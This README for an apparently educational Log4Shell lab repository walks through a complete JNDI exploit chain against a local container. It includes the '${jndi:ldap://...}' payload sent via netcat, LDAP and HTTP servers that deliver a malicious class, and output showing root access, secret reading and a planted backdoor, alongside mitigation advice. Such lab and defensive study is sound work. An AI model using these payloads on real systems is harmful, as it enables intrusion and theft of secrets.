# Log4Shell (CVE-2021-44228) Educational Demo

This repository demonstrates the **Log4Shell vulnerability** (CVE-2021-44228) for educational and security research purposes. It includes a complete working exploit chain showing Remote Code Execution via JNDI injection.

> ⚠️ **WARNING**: This is for educational purposes ONLY. Never use this against systems you don't own or have explicit permission to test.

## What is Log4Shell?

Log4Shell is a critical RCE vulnerability in Apache Log4j 2.x (versions 2.0-beta9 to 2.14.1) that allows attackers to execute arbitrary code by injecting a malicious JNDI lookup string into logged data.

**CVSS Score**: 10.0 (Critical)

## Table of Contents
- [Quick Start](#quick-start)
- [How the Exploit Works](#how-the-exploit-works)
- [Detailed Walkthrough](#detailed-walkthrough)
- [What the Exploit Demonstrates](#what-the-exploit-demonstrates)
- [Key Technical Details](#key-technical-details)
- [Defense & Mitigation](#defense--mitigation)
- [Commands Reference](#commands-reference)

## Quick Start

### Prerequisites
- **Podman** (or Docker)
- **Python 3**
- **Java 8+**
- **netcat**

### One-Time Setup
```bash
make build          # Build vulnerable container (Java 8u181 + Log4j 2.14.1)
make exploit-setup  # Clone marshalsec and compile exploit
```

### Running the Exploit

**Easy Mode (All servers in background):**
```bash
make start-all      # Start HTTP, LDAP, and vulnerable servers
make status         # Verify all servers are running
make test-exploit   # Send the malicious payload
make verify         # Check if exploit succeeded
make stop-all       # Stop all servers when done
```

**Manual Mode (Requires 4 terminals for visibility):**

**Terminal 1 - HTTP Server:**
```bash
make http-server
```

**Terminal 2 - LDAP Server:**
```bash
make ldap-server
```

**Terminal 3 - Vulnerable Application:**
```bash
make vulnerable-server
```

**Terminal 4 - Execute Exploit:**
```bash
make test-exploit   # Send the malicious payload
make verify         # Check if exploit succeeded
```

You should see output showing command execution as **root** inside the container!

## How the Exploit Works

### Attack Chain
```
1. Attacker sends:  ${jndi:ldap://192.168.1.100:1389/Exploit}
2. Log4j parses:    JNDI lookup triggered
3. Connects to:     LDAP server (port 1389)
4. LDAP redirects:  http://192.168.1.100:8888/Exploit.class
5. Java downloads:  Malicious class file
6. Class loads:     Static initializer executes
7. Result:          Remote Code Execution as root!
```

### Visual Attack Flow
```
┌─────────────┐      ┌──────────────┐      ┌─────────────┐      ┌──────────────┐
│   Attacker  │─────>│  Vulnerable  │─────>│    LDAP     │─────>│     HTTP     │
│             │ JNDI │   Log4j App  │ Ref  │   Server    │Class │    Server    │
└─────────────┘      └──────────────┘      └─────────────┘      └──────────────┘
                              │                                          │
                              │                                          │
                              └──────────< Downloads Exploit.class <─────┘
                              │
                              ▼
                        [Code Execution]
                   Runs commands as root
```

### Vulnerable Code Pattern
```java
// VULNERABLE - User input in format string
logger.error("Request: " + userInput);

// SAFE - Parameterized message
logger.error("Request: {}", userInput);
```

## Detailed Walkthrough

### Understanding the Components

#### 1. Vulnerable Server Container
- Runs a simple TCP server on port 8080
- Uses Log4j 2.14.1 (vulnerable version)
- Logs incoming requests with string concatenation (vulnerable pattern)
- Built with Java 8u181 + special JVM flags to allow JNDI remote class loading

#### 2. Malicious Payload (`exploit/Exploit.class`)
The exploit demonstrates realistic attack capabilities:
- **Identity reconnaissance**: `whoami`, `id` - shows execution as root
- **Environment scanning**: Reads secrets from environment variables
- **Network mapping**: Discovers hostname and network interfaces
- **Process enumeration**: Lists running processes
- **Persistence**: Creates executable backdoor file
- **Educational output**: Explains the attack and remediation

#### 3. HTTP Server (Port 8888)
- Simple Python HTTP server
- Serves the malicious `Exploit.class` file
- Logs show when the class is downloaded (proof of JNDI lookup)

#### 4. LDAP Referral Server (Marshalsec)
- Responds to JNDI lookups from Log4j
- Returns a reference pointing to the HTTP server
- Bridges the gap between JNDI and remote class loading

### Step-by-Step Exploitation

#### Step 1: Build the Vulnerable Container
```bash
make build
# Or manually: podman build -t log4jcve .
```

#### Step 2: Setup Exploit Environment (First Time Only)
```bash
make exploit-setup
# This will:
# 1. Clone the marshalsec JNDI exploitation toolkit
# 2. Build marshalsec with Maven
# 3. Compile the Exploit.java payload
```

#### Step 3: Start the HTTP Server
```bash
make http-server
# Or manually: cd exploit && python3 -m http.server 8888
```

**Test it:**
```bash
curl -I http://localhost:8888/Exploit.class
# Should return: HTTP/1.0 200 OK
```

#### Step 4: Start the LDAP Server
```bash
make ldap-server
# Auto-detects your IP address
# Or specify: HOST_IP=192.168.1.100 make ldap-server
```

You should see:
```
Listening on 0.0.0.0:1389
```

#### Step 5: Run the Vulnerable Application
```bash
make vulnerable-server
```

You should see:
```
Vulnerable server listening on port 8080
```

#### Step 6: Exploit the Vulnerability
```bash
make test-exploit
# Sends the payload and automatically waits 3 seconds
# Then run verify to check results
```

**Manual alternative:**
```bash
echo '${jndi:ldap://192.168.1.100:1389/Exploit}' | nc localhost 8080
```

#### Step 7: Verify Success
```bash
make verify
# Should run immediately after test-exploit
```

Expected output shows **full Remote Code Execution**:
```
╔════════════════════════════════════════════════════════════════╗
║   REMOTE CODE EXECUTION ACHIEVED VIA LOG4SHELL (CVE-2021-44228) ║
╚════════════════════════════════════════════════════════════════╝

=== IDENTITY & PRIVILEGES ===
Current User: root
uid=0(root) gid=0(root) groups=0(root)

=== FILE SYSTEM ACCESS ===
Environment Variables (including secrets):
SECRET_VALUE=if you can read this this code is vulnerable

=== NETWORK INFORMATION ===
Hostname: ibm
Network Interfaces: [full network config]

=== RUNNING PROCESSES ===
[Shows all running processes]

=== DEMONSTRATING FILE WRITE ===
-rwxr-xr-x. 1 root root 50 Oct 23 21:04 /tmp/backdoor.sh
```

## What the Exploit Demonstrates

### Why Running as Root is Devastating

The exploit shows exactly **why `whoami` returning "root" is so dangerous**:

1. **Total System Control**
   - UID 0 means unrestricted access to all files
   - Can read `/etc/shadow`, database configs, SSL certificates
   - Can modify any application code or system files

2. **Secret Exfiltration**
   ```bash
   SECRET_VALUE=if you can read this this code is vulnerable
   ```
   - Environment variables often contain API keys, passwords, tokens
   - Can access mounted secrets, config files, credentials

3. **Network Reconnaissance**
   - Discovers all network interfaces
   - Internal IP addresses for lateral movement
   - VPN connections (like Tailscale in the demo)

4. **Persistent Backdoor**
   ```bash
   -rwxr-xr-x. 1 root root 50 Oct 23 21:04 /tmp/backdoor.sh
   ```
   - Creates executable files for persistence
   - Can install cron jobs, modify startup scripts
   - Establishes reverse shells for continued access

5. **Real-World Attack Scenarios**
   - **Ransomware**: Encrypt all files, demand payment
   - **Cryptomining**: Use CPU/GPU for cryptocurrency
   - **Data Theft**: Exfiltrate customer data, intellectual property
   - **Lateral Movement**: Use as pivot point to attack other systems
   - **Supply Chain**: Inject malicious code into the application

## Key Technical Details

### Why the Original Setup Didn't Work

Through debugging, we discovered several critical issues:

1. **Java Version Issue**:
   - Java 8u181 from Debian 9 had **backported security patches**
   - Version number was misleading - it wasn't truly "vulnerable 8u181"
   - Required explicit JVM flags to bypass protections

2. **Required JVM Flags**:
   - `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` - Enables remote class loading (disabled by default in newer builds)
   - `-Dlog4j2.formatMsgNoLookups=false` - Ensures JNDI lookups are processed (just to be explicit)

3. **Makefile Variable Escaping** (Fixed):
   - Original: `echo '${jndi:ldap://$(HOST_IP):1389/Exploit}'` sent empty string
   - Make was expanding `${jndi:...}` as a Make variable (undefined = empty)
   - Fixed: `echo '\$${jndi:ldap://$(HOST_IP):1389/Exploit}'` properly escapes the `$`
   - Now `$(HOST_IP)` expands correctly while `${jndi:...}` is preserved

4. **Logging Pattern**:
   - Must use string concatenation: `logger.error("Request: " + input)`
   - Parameterized logging is SAFE: `logger.error("Request: {}", input)`
   - The vulnerability is in Log4j processing the message content

5. **Multi-stage Build**:
   - Build with newer Maven (Java 8u322) for modern tooling
   - Run with vulnerable Java 8u181 for actual exploitation
   - This matches real-world scenarios where build/runtime differ

### Container Configuration

**Dockerfile** uses a two-stage build:
```dockerfile
# Stage 1: Build with Maven 3.8.4 (Java 8u322)
FROM maven:3.8.4-jdk-8 AS builder
COPY . /usr/src/poc
WORKDIR /usr/src/poc
RUN mvn clean && mvn package

# Stage 2: Run with vulnerable Java 8u181
FROM openjdk:8u181-jdk
COPY --from=builder /usr/src/poc/target/log4j-rce-1.0-SNAPSHOT-jar-with-dependencies.jar /app/app.jar
WORKDIR /app

# Explicit flags required due to Debian security backports
CMD ["java",
     "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
     "-Dlog4j2.formatMsgNoLookups=false",
     "-cp", "/app/app.jar",
     "VulnerableApp"]
```

### Podman vs Docker

This demo uses **Podman** instead of Docker:

| Feature | Docker | Podman |
|---------|--------|--------|
| Daemon | Required | Daemonless |
| Root | Requires root by default | Rootless by default |
| Command | `docker` | `podman` (drop-in replacement) |
| Security | More attack surface | More secure |

Commands are nearly identical - just replace `docker` with `podman`.

## Troubleshooting

### "Exploit file not found" Error

If `make verify` shows "Exploit file not found - exploit may have failed", check these common issues:

1. **Timing Issue**: The exploit needs time to execute. The Makefile includes a 3-second wait, but you can wait a bit longer and run `make verify` again.

2. **Check if servers are running**:
   ```bash
   # Check HTTP server (port 8888)
   curl -I http://localhost:8888/Exploit.class

   # Check LDAP server (port 1389)
   ss -ltn | grep 1389

   # Check vulnerable server (port 8080)
   ss -ltn | grep 8080
   ```

3. **View server logs**:
   ```bash
   # Check LDAP server logs for connections
   cat logs/ldap-server.log

   # Check HTTP server logs for downloads
   cat logs/http-server.log

   # Check vulnerable app logs
   podman logs $(podman ps -q --filter ancestor=log4jcve)
   ```

4. **Verify IP address**: Make sure `HOST_IP` matches your actual network IP:
   ```bash
   hostname -I | awk '{print $1}'
   ```

5. **Test manually**: Send the payload directly and check container logs:
   ```bash
   echo '${jndi:ldap://192.168.1.100:1389/Exploit}' | nc localhost 8080
   sleep 5
   podman logs --tail 20 $(podman ps -q --filter ancestor=log4jcve)
   ```

### Successful Exploit Indicators

When the exploit works, you'll see:

- **LDAP server log**: Shows incoming connection and sending reference
- **HTTP server log**: Shows GET request for `Exploit.class`
- **Container logs**: Shows the exploit banner and command execution
- **Verify command**: Displays the full exploit output with secrets, network info, etc.

### Quick Test Cycle

For reliable testing, use this sequence:
```bash
# After all servers are running
make test-exploit && sleep 2 && make verify
```

Or use the background server mode:
```bash
make start-all    # Start all servers in background
make status       # Verify all are running
make test-exploit # Send exploit
make verify       # Check results
```

## Defense & Mitigation

### Immediate Actions

1. **Upgrade Log4j**: Use version 2.17.1 or later
   ```bash
   # Edit pom.xml
   <version>2.17.1</version>
   ```

2. **Set JVM Property** (if upgrade not immediately possible):
   ```bash
   java -Dlog4j2.formatMsgNoLookups=true ...
   ```

3. **Environment Variable**:
   ```bash
   export LOG4J_FORMAT_MSG_NO_LOOKUPS=true
   ```

4. **Remove JNDI Lookup Class** (emergency workaround):
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```

### Best Practices

1. **Use Parameterized Logging**:
   ```java
   // GOOD
   logger.error("User {} attempted action", username);

   // BAD
   logger.error("User " + username + " attempted action");
   ```

2. **Input Validation**:
   - Sanitize logged data
   - Block or escape `${` patterns in user input
   - Use allowlists for logged content

3. **Network Segmentation**:
   - Restrict outbound connections from application servers
   - Block LDAP/RMI/JNDI protocols at firewall
   - Use egress filtering

4. **Monitoring**:
   - Alert on JNDI lookup patterns: `${jndi:`
   - Monitor for unusual outbound connections
   - Track Java class loading from remote sources

5. **Web Application Firewall (WAF)**:
   - Deploy rules to block Log4Shell patterns
   - Monitor and block suspicious User-Agent strings
   - Inspect all HTTP headers for JNDI payloads

### Testing Defenses

To test if the vulnerability is fixed, edit `pom.xml`:
```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>  <!-- Use secure version -->
</dependency>
```

Rebuild and test - the exploit should fail.

## File Structure
```
.
├── Dockerfile                 # Two-stage build with Java 8u181
├── Makefile                   # Automated commands for exploit demo
├── README.md                  # This file - complete documentation
├── src/main/java/
│   └── VulnerableApp.java    # Vulnerable TCP server
├── exploit/
│   ├── Exploit.java          # Enhanced educational RCE payload
│   ├── Exploit.class         # Compiled exploit
│   └── marshalsec/           # JNDI exploitation toolkit
└── pom.xml                    # Log4j 2.14.1 dependency
```

## Commands Reference

| Command | Description |
|---------|-------------|
| `make help` | Show all available commands |
| `make build` | Build vulnerable container with Java 8u181 |
| `make exploit-setup` | Clone marshalsec and compile exploit payload |
| **Background Mode** | |
| `make start-all` | Start all servers in background (HTTP, LDAP, vulnerable app) |
| `make status` | Check if all servers are running |
| `make logs` | View available log files |
| `make logs TYPE=http` | View specific server logs (http/ldap/vulnerable) |
| `make stop-all` | Stop all background servers |
| **Manual Mode** | |
| `make http-server` | Start HTTP server on port 8888 (foreground) |
| `make ldap-server` | Start LDAP server on port 1389 (foreground, auto-detects IP) |
| `make vulnerable-server` | Run vulnerable application on port 8080 (foreground) |
| **Exploitation** | |
| `make test-exploit` | Send JNDI exploit payload to vulnerable server |
| `make verify` | Check if exploit succeeded and show output |
| **Cleanup** | |
| `make clean` | Stop all services and remove containers |

## Educational Value

This comprehensive demo teaches:

1. **Vulnerability Mechanics**:
   - How JNDI injection works in Log4j
   - The complete exploit chain from input to RCE
   - Why string concatenation in logging is dangerous

2. **Attack Techniques**:
   - Remote class loading via JNDI
   - LDAP referral attacks
   - Post-exploitation reconnaissance
   - Persistence mechanisms

3. **Security Concepts**:
   - Why parameterized logging is critical
   - How Java security features (trustURLCodebase) work
   - Container security implications
   - The importance of defense in depth

4. **Real-World Impact**:
   - What attackers can actually do with RCE
   - Why "running as root" is catastrophic
   - How quickly systems can be compromised
   - The difficulty of detecting such attacks

5. **Defense Strategies**:
   - Proper logging practices
   - Version management and patching
   - Network segmentation
   - Monitoring and detection

## Common Attack Vectors

Log4Shell can be triggered through any logged user input:

- **HTTP Headers**: User-Agent, X-Forwarded-For, Referer, etc.
- **Form Fields**: Any POST/GET parameter that gets logged
- **URL Parameters**: Query strings, path parameters
- **WebSocket Messages**: Real-time communication data
- **File Uploads**: Filename metadata
- **Authentication**: Usernames, failed login attempts
- **API Requests**: JSON fields, XML attributes

## Real-World Impact

Systems confirmed vulnerable to Log4Shell:

- **Apache Ecosystem**: Struts, Solr, Druid, Flink
- **Virtualization**: VMware vCenter, Horizon
- **Gaming**: Minecraft servers (one of the first discoveries)
- **Cloud Services**: Various AWS, Azure, GCP services
- **Enterprise Software**: Numerous commercial applications
- **IoT Devices**: Smart home systems, industrial control

The ubiquity of Log4j meant **hundreds of millions** of systems were potentially vulnerable.

## References

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) - Official CVE entry
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html) - Official security page
- [Marshalsec JNDI Toolkit](https://github.com/mbechler/marshalsec) - Exploitation framework
- [CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a) - US Government guidance
- [LunaSec Advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/) - Detailed technical analysis
- [Original PoC Source](https://packetstormsecurity.com/files/download/165225/apache-log4j-poc-main.zip) - Base code

## Cleanup

Stop all services:
```bash
make clean
```

Or manually:
```bash
# Stop container
podman stop $(podman ps -q --filter ancestor=log4jcve)

# Stop HTTP server
pkill -f "python3 -m http.server 8888"

# Stop LDAP server
pkill -f "marshalsec.jndi.LDAPRefServer"
```

## License & Credits

Educational use only. Based on original code from Packet Storm Security.

This is a fork for personal learning and teaching purposes. The repository demonstrates responsible vulnerability research practices.

---

**Remember**: This is a learning tool. Understanding vulnerabilities helps build better defenses. Always practice responsible disclosure and ethical security research. Never test exploits on systems you don't own or have explicit permission to test.
